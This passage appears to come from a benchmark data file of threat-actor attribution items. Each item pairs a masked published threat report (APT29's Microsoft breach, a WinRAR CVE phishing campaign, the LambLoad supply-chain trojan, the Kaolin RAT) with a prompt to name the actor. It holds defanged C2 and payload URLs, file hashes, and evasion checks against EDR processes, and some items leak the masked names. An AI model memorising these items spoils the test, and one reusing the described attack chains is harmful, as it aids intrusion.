elusive espionage groups.    In reviewing security camera footage, the Dutch government determined that the Russian Foreign Intelligence Service (or SVR) led this group. [PLACEHOLDER]’s primary objectives include acquiring political, economic and military intelligence to gain a competitive advantage, supporting geopolitical goals and enhancing Russia’s influence on the global stage. The group’s long-term and covert approach reflects its commitment to achieving sustained access to sensitive information, allowing it to conduct strategic operations over an extended period.    Industry experts generally agree that this threat actor formed in 2008 and has been targeting government entities, think tanks and critical infrastructure since 2010. Cozy Bear has since been linked to several high-profile cyber-attacks, including the 2016 breach of the Democratic National Committee (DNC), the SolarWinds supply chain attack of 2019 and the Republican National Committee (RNC) in 2021. This threat actor is known to be extremely patient and cautious. Cozy Bear sometimes dwells inside a network for years if the target is valuable enough.    Quick aside: An interesting thing to note is that the SolarWinds breach was the first time an attack method called Golden SAML was documented in the wild. The attack method was first discovered by CyberArk Labs’ Shaked Reiner in 2017.    What Happened to Microsoft (What We Know So Far)  On Jan. 12, Microsoft detected a threat actor who gained access to a small percentage of corporate email accounts, exfiltrated emails and attached documents of high-value targets, including those of senior leadership, cybersecurity and legal teams, along with other internal employee identities.    Based on the details provided by Microsoft at the time of this writing, it appears the initial objective of the attack was to acquire information. Once inside target email accounts, Cozy Bear searched for specific information about, well, Cozy Bear. The group likely wanted to better understand its adversary (the intelligence teams gathering information on it) and discover the countermeasures intended to lure and stop it. Examples of what the threat actor might be interested in include indicators of compromise (IoC), exposed cloud infrastructure used by the attacker, IP ranges and known tactics, techniques and procedures (TTPs).    Analyzing the Microsoft Breach  Based on the information provided by Microsoft on Jan. 19, it appears the threat actor gained access to a “legacy, non-production test tenant account” through a password spray attack.    Password spraying is a brute-force attack where the attacker slowly tries a list of passwords against accounts from various source IP addresses. This simple attack keeps the number of requests below the standard rate limit to stop rapid login attempts from single IP addresses. This technique helps its attacker avoid detection by not locking out user accounts due to multiple failed login attempts, a common identity threat detection and response (ITDR) capability offered in access management and privileged access management (PAM) solutions. This type of attack is significantly slower but much more difficult to detect. Subsequently, password spraying has a much higher chance of succeeding.    Using this technique, the attacker compromised and accessed the account. The question that comes to mind is, if this was publicly facing, why was multi-factor authentication (MFA) not part of the authentication flow?    In this situation, the permissions set was limited. However, the test account had access to an OAuth application that had elevated access into their corporate environment. Although this was deemed a “legacy” account, it still was authorized to access the production systems. This coverage gap is a familiar blind spot for many organizations; even with great technical controls to implement least privilege access, people and processes (such as ongoing entitlement reviews) remain essential elements of identity security programs.    At this point, the attacker created a series of malicious OAuth applications that enabled them to have multiple hooks into the target, providing higher persistence while making the defender’s job even harder. Afterward, the threat actor created a new user account to grant access to the Microsoft corporate environment for the other newly created and malicious OAuth applications. Then, the attacker used the initial compromised legacy test OAuth application to grant the newly created OAuth apps the Office 365 Exchange Online *full_access_as_app* role. This role typically grants extensive access and privileges to an application – which, in this case, allowed access to target mailboxes.    The granted privilege here is meaningful because it enabled the adversary to read and exfiltrate emails and attachments. This unauthorized connection was accomplished by generating valid access tokens to Microsoft’s Exchange server, even if the original user was not allowed to do so.    Surmised Microsoft Attack Flow  Microsoft Attack Flow    The graphic above charts [PLACEHOLDER]’s steps:    Performed reconnaissance to identify potential victims (e.g., through LinkedIn, OSINT).  Performed password spraying attack on the identified entities discovered in step 1.  Accessed the compromised account (legacy test tenant).  Escalated privileges by accessing an OAuth application with elevated privileges to the corporate environment.  Created a few malicious OAuth applications.  Created a new user account to grant consent in the Microsoft corporate environment for the malicious apps created in step 5.  Granted the malicious apps Office 365 Exchange Online *full_access_as_app* role using the credentials gained from step 4.  Read and exfiltrated emails belonging to Microsoft’s executive leadership team and security staff.  Prerequisite Misconfiguration Assumptions  Based on the information disclosed, we assume that certain misconfigurations were present:    Access to an OAuth application with elevated permissions to the internal environment.  Privileges allowing the creation of OAuth apps and users.  Privileges for reading emails.  It’s also worth mentioning that even though this attack created limited practical impact (stolen emails and file attachments), it can still escalate damage through various other paths, such as the exfiltration of regulated data or the disruption of systems.    What Your Organization Can Do to Help Prevent a Similar Attack  Protect Your Non-production Environments  One common mistake IT organizations make is that under-protected development environments are exposed to the internet, allowing access to threat actors. These environments should be segmented and not easily accessible from outside an organization’s perimeter. Organizations should extend cybersecurity controls in production environments into non-production environments – failure to follow best practices cause data breaches.    Another common mistake I see organizations make is using unsensitized data in test environments, allowing easy exfiltration. End user emails and attachments were not present in the legacy tenant. Still, Microsoft admitted it used the same credentials in its production environment and this legacy tenant. The threat actor’s ability to pivot and access production data resulted from reusing privileged credentials and the absence of segmenting nonproduction and production environments.    Because organizations cannot implicitly trust that best practices are adhered to by the people implementing the environments, we need to extend multiple controls, such as MFA, to environments outside of production. Everyone knows that MFA is important. That said, many organizations, including one of the largest tech giants in the world, didn’t use it correctly, at least in this case. Additionally, we must assume that systems are not always set up securely. Misconfigurations and accounts being over-provisioned are inevitable, which is why we preach taking a defense-in-depth approach to cybersecurity. Leveraging controls like least privilege and MFA to non-production environments is incredibly important.    Implement Identity Threat Detection and Response (ITDR)  The ATP29 attack on Microsoft is a textbook example of how ITDR is critical to an organization.    Starting with the initial access through password spray using a proxy, the lack of MFA followed – and the creation of privileged OAuth applications eventually led to generating a user account with a sensitive privilege … All these actions had the potential for detection and response.    Like every element of cybersecurity, ITDR capabilities are more effective when tightly integrated into an identity fabric that proactively reduces risk rather than waiting for an attack to be detected. CyberArk Labs is working on a project in the ITDR world, and we are pleased to share that our suggested ITDR list of rules covers most aspects of the attack.    Defenders should re-evaluate the effectiveness of their password spray detections against the “low volume” style of attack described above. The focus on OAuth emphasizes the importance of such detections and the need for a comprehensive ITDR solution covering both on-prem and Cloud aspects.    An additional line of defense includes having controls to prevent credentials reuse and to rotate all credentials consistently according to organizational policy. Finally, detecting the entry of risky commands could have further reduced the risk of this attack by limiting lateral and vertical movement.    Security teams should carefully review every impersonation action between non-human and human entities. Require administrative privileges for the OAuth application approval process (Consent).    Suggested ITDR Detections and Responses  The following recommendations correspond to password spraying attacks, OAuth abuse, and other malicious actions. You can monitor the following events to detect:    Login without MFA (and respond automatically, accordingly)  Reuse of authentication credentials and force rotation  Suspicious creation or reactivation of OAuth applications  The idle activity of an OAuth application  New admin privileges granted to a user and try to add correlation with deviation from an approved organizational process for changing and adding privileges (e.g., the need to open an IT support ticket or to authenticate with MFA again)  The activity of a user without a prior explicit user authentication (or session start event)  MFA-configured user behavior without a prior MFA check  Attempted actions that failed due to the post-expiration time of the credentials\tokens\cookie used  Entry of malicious commands  Attempts to bypass privileged access management solutions  User login using a proxy  The Time to Act is Now (and Always)  This recent attack on Microsoft is a stark reminder of the persistent and sophisticated threats from nation-state threat actors. And it isn’t likely the last we’ll see from Cozy Bear. Days after Microsoft’s breach announcement, other organizations have also announced they had fallen victim to this threat actor. CyberArk Labs expects that more attacks will continue to become public now that these indicators of compromise are available to everyone. It’s also essential to acknowledge that the threat landscape is not limited to a single actor or nation. Other states are actively developing and refining their cyber capabilities, ready to launch similar attacks with varying motives.    The attack is also a sobering glimpse into the future of cyber warfare. It serves as a call to action for heightened vigilance, collaboration and investment in cybersecurity. The looming specter of nation-state cyberattacks demands our attention, and the time to fortify ourselves is now. Ignoring these warnings would be to our peril. As a global community, we must work collectively to safeguard our digital infrastructure from the growing threat of nation-state cyber aggression.
https://www.infosecurity-magazine.com/news/russias-apt29-embassies-ngrok/	Ukrainian security researchers have revealed a major new Russian cyber-espionage campaign which they claim may have been designed to harvest information on Azerbaijan’s military strategy.    [PLACEHOLDER] was behind the attacks, according to a new report from the Ukrainian National Security and Defense Council (NDSC).    It targeted embassies in Azerbaijan, Greece, Romania and Italy, as well as international institutions such as the World Bank, European Commission, Council of Europe, WHO, UN and others.    “The geopolitical implications are profound. Among the several conceivable motives, one of the most apparent aims of the SVR might be to gather intelligence concerning Azerbaijan’s strategic activities, especially in the lead-up to the Azerbaijani invasion of Nagorno-Karabakh,” said the NDSC.    “It’s noteworthy that the countries targeted – Azerbaijan, Greece, Romania, and Italy – maintain significant political and economic ties with Azerbaijan.”    Read more on [PLACEHOLDER]: Diplomats in Ukraine Targeted by “Staggering” BMW Phishing Campaign    The campaign itself began as a spear-phishing email, using the lure of a diplomatic car for sale. The RAR attachment featured CVE-2023-3883, a bug which enables threat actors to insert malicious folders with the same name as benign files in a .zip archive.    “In the course of the user’s effort to open the harmless file, the system unwittingly processes the concealed malicious content within the folder with a matching name, thus enabling the execution of arbitrary code,” the NDSC explained.    In this attack, when a user clicks on the RAR archive contained in the phishing email it will execute a script to display a PDF of the car ‘for sale,’ whilst simultaneously downloading and executing a PowerShell script. The threat actors apparently use a Ngrok free static domain to access their malicious payload server hosted on a Ngrok instance.    “By exploiting Ngrok’s capabilities in this manner, threat actors can further complicate cybersecurity efforts and remain under the radar, making defense and attribution more challenging,” noted the report.    This isn’t the first time hackers have exploited CVE-2023-3883. It was observed being exploited by the Russian [PLACEHOLDER] APT group in August, shortly after Group-IB first notified about what was then a zero-day vulnerability.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Ukrainian security researchers have revealed a major new Russian cyber-espionage campaign which they claim may have been designed to harvest information on Azerbaijan’s military strategy.    [PLACEHOLDER] was behind the attacks, according to a new report from the Ukrainian National Security and Defense Council (NDSC).    It targeted embassies in Azerbaijan, Greece, Romania and Italy, as well as international institutions such as the World Bank, European Commission, Council of Europe, WHO, UN and others.    “The geopolitical implications are profound. Among the several conceivable motives, one of the most apparent aims of the SVR might be to gather intelligence concerning Azerbaijan’s strategic activities, especially in the lead-up to the Azerbaijani invasion of Nagorno-Karabakh,” said the NDSC.    “It’s noteworthy that the countries targeted – Azerbaijan, Greece, Romania, and Italy – maintain significant political and economic ties with Azerbaijan.”    Read more on [PLACEHOLDER]: Diplomats in Ukraine Targeted by “Staggering” BMW Phishing Campaign    The campaign itself began as a spear-phishing email, using the lure of a diplomatic car for sale. The RAR attachment featured CVE-2023-3883, a bug which enables threat actors to insert malicious folders with the same name as benign files in a .zip archive.    “In the course of the user’s effort to open the harmless file, the system unwittingly processes the concealed malicious content within the folder with a matching name, thus enabling the execution of arbitrary code,” the NDSC explained.    In this attack, when a user clicks on the RAR archive contained in the phishing email it will execute a script to display a PDF of the car ‘for sale,’ whilst simultaneously downloading and executing a PowerShell script. The threat actors apparently use a Ngrok free static domain to access their malicious payload server hosted on a Ngrok instance.    “By exploiting Ngrok’s capabilities in this manner, threat actors can further complicate cybersecurity efforts and remain under the radar, making defense and attribution more challenging,” noted the report.    This isn’t the first time hackers have exploited CVE-2023-3883. It was observed being exploited by the Russian [PLACEHOLDER] APT group in August, shortly after Group-IB first notified about what was then a zero-day vulnerability.
https://www.microsoft.com/en-us/security/blog/2023/11/22/diamond-sleet-supply-chain-compromise-distributes-a-modified-cyberlink-installer/	Microsoft Threat Intelligence has uncovered a supply chain attack by the North Korea-based threat actor [PLACEHOLDER] involving a malicious variant of an application developed by CyberLink Corp., a software company that develops multimedia software products. This malicious file is a legitimate CyberLink application installer that has been modified to include malicious code that downloads, decrypts, and loads a second-stage payload. The file, which was signed using a valid certificate issued to CyberLink Corp., is hosted on legitimate update infrastructure owned by CyberLink and includes checks to limit the time window for execution and evade detection by security products. Thus far, the malicious activity has impacted over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States.    Microsoft attributes this activity with high confidence to [PLACEHOLDER], a North Korean threat actor. The second-stage payload observed in this campaign communicates with infrastructure that has been previously compromised by [PLACEHOLDER]. More recently, Microsoft has observed [PLACEHOLDER] utilizing trojanized open-source and proprietary software to target organizations in information technology, defense, and media.    To address the potential risk of further attacks against our customers, Microsoft has taken the following steps to protect customers in response to this malicious activity:    Microsoft has communicated this supply chain compromise to CyberLink   Microsoft is notifying Microsoft Defender for Endpoint customers that have been targeted or compromised in this campaign  Microsoft reported the attack to GitHub, which removed the second-stage payload in accordance with its Acceptable Use Policies  Microsoft has added the CyberLink Corp. certificate used to sign the malicious file to its disallowed certificate list  Microsoft Defender for Endpoint detects this activity as [PLACEHOLDER] activity group.  Microsoft Defender Antivirus detects the malware as Trojan:Win32/LambLoad.  Microsoft may update this blog as additional insight is gained into the tactics, techniques, and procedures (TTPs) used by the threat actor in this active and ongoing campaign.    Who is [PLACEHOLDER]?  The actor that Microsoft tracks as [PLACEHOLDER] (formerly ZINC) is a North Korea-based activity group known to target media, defense, and information technology (IT) industries globally. [PLACEHOLDER] focuses on espionage, theft of personal and corporate data, financial gain, and corporate network destruction. [PLACEHOLDER] is known to use a variety of custom malware that is exclusive to the group. Recent [PLACEHOLDER] malware is described in Microsoft’s reporting of the group’s weaponization of open source software and exploitation of N-day vulnerabilities. [PLACEHOLDER] overlaps with activity tracked by other security companies as Temp.Hermit and Labyrinth Chollima.    Activity overview  Microsoft has observed suspicious activity associated with the modified CyberLink installer file as early as October 20, 2023. The malicious file has been seen on over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States. While Microsoft has not yet identified hands-on-keyboard activity carried out after compromise via this malware, the group has historically:    Exfiltrated sensitive data from victim environments  Compromised software build environments  Moved downstream to additional victims for further exploitation  Used techniques to establish persistent access to victim environments  [PLACEHOLDER] utilized a legitimate code signing certificate issued to CyberLink Corp. to sign the malicious executable. This certificate has been added to Microsoft’s disallowed certificate list to protect customers from future malicious use of the certificate:    Signer: CyberLink Corp.   Issuer: DigiCert SHA2 Assured ID Code Signing CA   SignerHash: 8aa3877ab68ba56dabc2f2802e813dc36678aef4   CertificateSerialNumber: 0a08d3601636378f0a7d64fd09e4a13b    Microsoft currently tracks the malicious application and associated payloads as LambLoad.    LambLoad  LambLoad is a weaponized downloader and loader containing malicious code added to a legitimate CyberLink application. The primary LambLoad loader/downloader sample Microsoft identified has the SHA-256 hash 166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be.    Before launching any malicious code, the LambLoad executable ensures that the date and time of the local host align with a preconfigured execution period.    screenshot of malware code for checking date and time of the host  Figure 1. Code for checking date and time of local host  The loader then targets environments that are not using security software affiliated with FireEye, CrowdStrike, or Tanium by checking for the following process names:    csfalconservice.exe (CrowdStrike Falcon)  xagt.exe (FireEye agent)  taniumclient.exe (Tanium EDR solution)  If these criteria are not met, the executable continues running the CyberLink software and abandons further execution of malicious code. Otherwise, the software attempts to contact one of three URLs to download the second-stage payload embedded inside a file masquerading as a PNG file using the static User-Agent ‘Microsoft Internet Explorer’:    hxxps[:]//i.stack.imgur[.]com/NDTUM.png  hxxps[:]//www.webville[.]net/images/CL202966126.png  hxxps[:]//cldownloader.github[.]io/logo.png  The PNG file contains an embedded payload inside a fake outer PNG header that is, carved, decrypted, and launched in memory.    screenshot of malware code for embedded PNG file  Figure 2. Payload embedded in PNG file  When invoked, the in-memory executable attempts to contact the following callbacks for further instruction. Both domains are legitimate but have been compromised by [PLACEHOLDER]:    hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php  hxxps[:]//zeduzeventos.busqueabuse[.]com/wp-admin/js/widgets/sub/wids.php  The crypted contents of the PNG file (SHA-256: 089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d) may be manually carved using the following command:    Screenshot of Python code command  To restore the in-memory payload statically for independent analysis, the following Python script can be used to decrypt the carved contents.    Screenshot of Python code command  To crypt and verify:    Screenshot of Python code command  Both the fake PNG and decrypted PE payload have been made available on VirusTotal.    Recommendations  Microsoft recommends the following mitigations to reduce the impact of this threat. Check the recommendations card for the deployment status of monitored mitigations.    Use Microsoft Defender Antivirus to protect from this threat. Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.  Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.  Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.  Take immediate action to address malicious activity on the impacted device. If malicious code has been launched, the attacker has likely taken complete control of the device. Immediately isolate the system and perform a reset of credentials and tokens.  Investigate the device timeline for indications of lateral movement activities using one of the compromised accounts. Check for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. Ensure data integrity with hash codes.  Turn on the following attack surface reduction rule: Block executable files from running unless they meet a prevalence, age, or trusted list criterion.  Detection details  Microsoft Defender Antivirus    Microsoft Defender Antivirus detects threat components as the following malware:    Trojan:Win32/LambLoad.A!dha  Trojan:Win32/LambLoad.B!dha  Trojan:Win32/LambLoad.C!dha  Trojan:Win64/LambLoad.D!dha  Trojan:Win64/LambLoad.E!dha  Microsoft Defender for Endpoint    Alerts with the following title in the security center can indicate threat activity on your network:    [PLACEHOLDER] activity group  The following alert might also indicate threat activity related to this threat. Note, however, that this alert can be also triggered by unrelated threat activity.    An executable loaded an unexpected dll	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Microsoft Threat Intelligence has uncovered a supply chain attack by the North Korea-based threat actor [PLACEHOLDER] involving a malicious variant of an application developed by CyberLink Corp., a software company that develops multimedia software products. This malicious file is a legitimate CyberLink application installer that has been modified to include malicious code that downloads, decrypts, and loads a second-stage payload. The file, which was signed using a valid certificate issued to CyberLink Corp., is hosted on legitimate update infrastructure owned by CyberLink and includes checks to limit the time window for execution and evade detection by security products. Thus far, the malicious activity has impacted over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States.    Microsoft attributes this activity with high confidence to [PLACEHOLDER], a North Korean threat actor. The second-stage payload observed in this campaign communicates with infrastructure that has been previously compromised by [PLACEHOLDER]. More recently, Microsoft has observed [PLACEHOLDER] utilizing trojanized open-source and proprietary software to target organizations in information technology, defense, and media.    To address the potential risk of further attacks against our customers, Microsoft has taken the following steps to protect customers in response to this malicious activity:    Microsoft has communicated this supply chain compromise to CyberLink   Microsoft is notifying Microsoft Defender for Endpoint customers that have been targeted or compromised in this campaign  Microsoft reported the attack to GitHub, which removed the second-stage payload in accordance with its Acceptable Use Policies  Microsoft has added the CyberLink Corp. certificate used to sign the malicious file to its disallowed certificate list  Microsoft Defender for Endpoint detects this activity as [PLACEHOLDER] activity group.  Microsoft Defender Antivirus detects the malware as Trojan:Win32/LambLoad.  Microsoft may update this blog as additional insight is gained into the tactics, techniques, and procedures (TTPs) used by the threat actor in this active and ongoing campaign.    Who is [PLACEHOLDER]?  The actor that Microsoft tracks as [PLACEHOLDER] (formerly ZINC) is a North Korea-based activity group known to target media, defense, and information technology (IT) industries globally. [PLACEHOLDER] focuses on espionage, theft of personal and corporate data, financial gain, and corporate network destruction. [PLACEHOLDER] is known to use a variety of custom malware that is exclusive to the group. Recent [PLACEHOLDER] malware is described in Microsoft’s reporting of the group’s weaponization of open source software and exploitation of N-day vulnerabilities. [PLACEHOLDER] overlaps with activity tracked by other security companies as Temp.Hermit and Labyrinth Chollima.    Activity overview  Microsoft has observed suspicious activity associated with the modified CyberLink installer file as early as October 20, 2023. The malicious file has been seen on over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States. While Microsoft has not yet identified hands-on-keyboard activity carried out after compromise via this malware, the group has historically:    Exfiltrated sensitive data from victim environments  Compromised software build environments  Moved downstream to additional victims for further exploitation  Used techniques to establish persistent access to victim environments  [PLACEHOLDER] utilized a legitimate code signing certificate issued to CyberLink Corp. to sign the malicious executable. This certificate has been added to Microsoft’s disallowed certificate list to protect customers from future malicious use of the certificate:    Signer: CyberLink Corp.   Issuer: DigiCert SHA2 Assured ID Code Signing CA   SignerHash: 8aa3877ab68ba56dabc2f2802e813dc36678aef4   CertificateSerialNumber: 0a08d3601636378f0a7d64fd09e4a13b    Microsoft currently tracks the malicious application and associated payloads as LambLoad.    LambLoad  LambLoad is a weaponized downloader and loader containing malicious code added to a legitimate CyberLink application. The primary LambLoad loader/downloader sample Microsoft identified has the SHA-256 hash 166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be.    Before launching any malicious code, the LambLoad executable ensures that the date and time of the local host align with a preconfigured execution period.    screenshot of malware code for checking date and time of the host  Figure 1. Code for checking date and time of local host  The loader then targets environments that are not using security software affiliated with FireEye, CrowdStrike, or Tanium by checking for the following process names:    csfalconservice.exe (CrowdStrike Falcon)  xagt.exe (FireEye agent)  taniumclient.exe (Tanium EDR solution)  If these criteria are not met, the executable continues running the CyberLink software and abandons further execution of malicious code. Otherwise, the software attempts to contact one of three URLs to download the second-stage payload embedded inside a file masquerading as a PNG file using the static User-Agent ‘Microsoft Internet Explorer’:    hxxps[:]//i.stack.imgur[.]com/NDTUM.png  hxxps[:]//www.webville[.]net/images/CL202966126.png  hxxps[:]//cldownloader.github[.]io/logo.png  The PNG file contains an embedded payload inside a fake outer PNG header that is, carved, decrypted, and launched in memory.    screenshot of malware code for embedded PNG file  Figure 2. Payload embedded in PNG file  When invoked, the in-memory executable attempts to contact the following callbacks for further instruction. Both domains are legitimate but have been compromised by [PLACEHOLDER]:    hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php  hxxps[:]//zeduzeventos.busqueabuse[.]com/wp-admin/js/widgets/sub/wids.php  The crypted contents of the PNG file (SHA-256: 089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d) may be manually carved using the following command:    Screenshot of Python code command  To restore the in-memory payload statically for independent analysis, the following Python script can be used to decrypt the carved contents.    Screenshot of Python code command  To crypt and verify:    Screenshot of Python code command  Both the fake PNG and decrypted PE payload have been made available on VirusTotal.    Recommendations  Microsoft recommends the following mitigations to reduce the impact of this threat. Check the recommendations card for the deployment status of monitored mitigations.    Use Microsoft Defender Antivirus to protect from this threat. Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.  Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.  Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.  Take immediate action to address malicious activity on the impacted device. If malicious code has been launched, the attacker has likely taken complete control of the device. Immediately isolate the system and perform a reset of credentials and tokens.  Investigate the device timeline for indications of lateral movement activities using one of the compromised accounts. Check for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. Ensure data integrity with hash codes.  Turn on the following attack surface reduction rule: Block executable files from running unless they meet a prevalence, age, or trusted list criterion.  Detection details  Microsoft Defender Antivirus    Microsoft Defender Antivirus detects threat components as the following malware:    Trojan:Win32/LambLoad.A!dha  Trojan:Win32/LambLoad.B!dha  Trojan:Win32/LambLoad.C!dha  Trojan:Win64/LambLoad.D!dha  Trojan:Win64/LambLoad.E!dha  Microsoft Defender for Endpoint    Alerts with the following title in the security center can indicate threat activity on your network:    [PLACEHOLDER] activity group  The following alert might also indicate threat activity related to this threat. Note, however, that this alert can be also triggered by unrelated threat activity.    An executable loaded an unexpected dll
https://thehackernews.com/2024/04/north-koreas-lazarus-group-deploys-new.html	The North Korea-linked threat actor known as [PLACEHOLDER] employed its time-tested fabricated job lures to deliver a new remote access trojan called Kaolin RAT as part of attacks targeting specific individuals in the Asia region in summer 2023.    The malware could, "aside from standard RAT functionality, change the last write timestamp of a selected file and load any received DLL binary from [command-and-control] server," Avast security researcher Luigino Camastra said in a report published last week.    The RAT acts as a pathway to deliver the FudModule rootkit, which has been recently observed leveraging a now-patched admin-to-kernel exploit in the appid.sys driver (CVE-2024-21338, CVSS score: 7.8) to obtain a kernel read/write primitive and ultimately disable security mechanisms.    The [PLACEHOLDER]'s use of job offer lures to infiltrate targets is not new. Dubbed Operation Dream Job, the long-running campaign has a track record of using various social media and instant messaging platforms to deliver malware.    Cybersecurity  These initial access vectors trick targets into launching a malicious optical disc image (ISO) file bearing three files, one of which masquerades as an Amazon VNC client ("AmazonVNC.exe") that, in reality, is a renamed version of a legitimate Windows application called "choice.exe."    The two other files, named "version.dll" and "aws.cfg," act as a catalyst to kick-start the infection chain. Specifically, the executable "AmazonVNC.exe" is used to side-load "version.dll," which, in turn, spawns an IExpress.exe process and injects into it a payload residing within "aws.cfg."    The payload is designed to download shellcode from a command-and-control (C2) domain ("henraux[.]com"), which is suspected to be an actual-but-hacked website belonging to an Italian company that specializes in excavating and processing marble and granite.    While the exact nature of the shellcode is unclear, it's said to be used to launch RollFling, a DLL-based loader that serves to retrieve and launch the next-stage malware named RollSling, which was disclosed by Microsoft last year in connection with a [PLACEHOLDER] campaign exploiting a critical JetBrains TeamCity flaw (CVE-2023-42793, CVSS score: 9.8).    RollSling, executed directly in memory in a likely attempt to evade detection by security software, represents the next phase of the infection procedure. Its primary function is to trigger the execution of a third loader dubbed RollMid that's also run in the system's memory.    Fake Job Lures  RollMid comes fitted with capabilities to set the stage for the attack and establish contact with a C2 server, which involves a three-step process of its own as follows -    Communicate with the first C2 server to fetch a HTML file containing the address of the second C2 server  Communicate with the second C2 server to fetch a PNG image that embeds a malicious component using a technique called steganography  Transmit data to the third C2 server using the address specified in the concealed data within the image  Retrieve an additional Base64-encoded data blob from the third C2 server, which is the Kaolin RAT  The technical sophistication behind the multi-stage sequence, while no doubt complex and intricate, borders on overkill, Avast opined, with the Kaolin RAT paving the way for the deployment of the FudModule rootkit after setting up communications with the RAT's C2 server.    Cybersecurity  On top of that, the malware is equipped to enumerate files; carry out file operations; upload files to the C2 server; alter a file's last modified timestamp; enumerate, create, and terminate processes; execute commands using cmd.exe; download DLL files from the C2 server; and connect to an arbitrary host.    "The [PLACEHOLDER] targeted individuals through fabricated job offers and employed a sophisticated toolset to achieve better persistence while bypassing security products," Camastra said.    "It is evident that they invested significant resources in developing such a complex attack chain. What is certain is that Lazarus had to innovate continuously and allocate enormous resources to research various aspects of Windows mitigations and security products. Their ability to adapt and evolve poses a significant challenge to cybersecurity efforts."	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The North Korea-linked threat actor known as [PLACEHOLDER] employed its time-tested fabricated job lures to deliver a new remote access trojan called Kaolin RAT as part of attacks targeting specific individuals in the Asia region in summer 2023.    The malware could, "aside from standard RAT functionality, change the last write timestamp of a selected file and load any received DLL binary from [command-and-control] server," Avast security researcher Luigino Camastra said in a report published last week.    The RAT acts as a pathway to deliver the FudModule rootkit, which has been recently observed leveraging a now-patched admin-to-kernel exploit in the appid.sys driver (CVE-2024-21338, CVSS score: 7.8) to obtain a kernel read/write primitive and ultimately disable security mechanisms.    The [PLACEHOLDER]'s use of job offer lures to infiltrate targets is not new. Dubbed Operation Dream Job, the long-running campaign has a track record of using various social media and instant messaging platforms to deliver malware.    Cybersecurity  These initial access vectors trick targets into launching a malicious optical disc image (ISO) file bearing three files, one of which masquerades as an Amazon VNC client ("AmazonVNC.exe") that, in reality, is a renamed version of a legitimate Windows application called "choice.exe."    The two other files, named "version.dll" and "aws.cfg," act as a catalyst to kick-start the infection chain. Specifically, the executable "AmazonVNC.exe" is used to side-load "version.dll," which, in turn, spawns an IExpress.exe process and injects into it a payload residing within "aws.cfg."    The payload is designed to download shellcode from a command-and-control (C2) domain ("henraux[.]com"), which is suspected to be an actual-but-hacked website belonging to an Italian company that specializes in excavating and processing marble and granite.    While the exact nature of the shellcode is unclear, it's said to be used to launch RollFling, a DLL-based loader that serves to retrieve and launch the next-stage malware named RollSling, which was disclosed by Microsoft last year in connection with a [PLACEHOLDER] campaign exploiting a critical JetBrains TeamCity flaw (CVE-2023-42793, CVSS score: 9.8).    RollSling, executed directly in memory in a likely attempt to evade detection by security software, represents the next phase of the infection procedure. Its primary function is to trigger the execution of a third loader dubbed RollMid that's also run in the system's memory.    Fake Job Lures  RollMid comes fitted with capabilities to set the stage for the attack and establish contact with a C2 server, which involves a three-step process of its own as follows -    Communicate with the first C2 server to fetch a HTML file containing the address of the second C2 server  Communicate with the second C2 server to fetch a PNG image that embeds a malicious component using a technique called steganography  Transmit data to the third C2 server using the address specified in the concealed data within the image  Retrieve an additional Base64-encoded data blob from the third C2 server, which is the Kaolin RAT  The technical sophistication behind the multi-stage sequence, while no doubt complex and intricate, borders on overkill, Avast opined, with the Kaolin RAT paving the way for the deployment of the FudModule rootkit after setting up communications with the RAT's C2 server.    Cybersecurity  On top of that, the malware is equipped to enumerate files; carry out file operations; upload files to the C2 server; alter a file's last modified timestamp; enumerate, create, and terminate processes; execute commands using cmd.exe; download DLL files from the C2 server; and connect to an arbitrary host.    "The [PLACEHOLDER] targeted individuals through fabricated job offers and employed a sophisticated toolset to achieve better persistence while bypassing security products," Camastra said.    "It is evident that they invested significant resources in developing such a complex attack chain. What is certain is that Lazarus had to innovate continuously and allocate enormous resources to research various aspects of Windows mitigations and security products. Their ability to adapt and evolve poses a significant challenge to cybersecurity efforts."
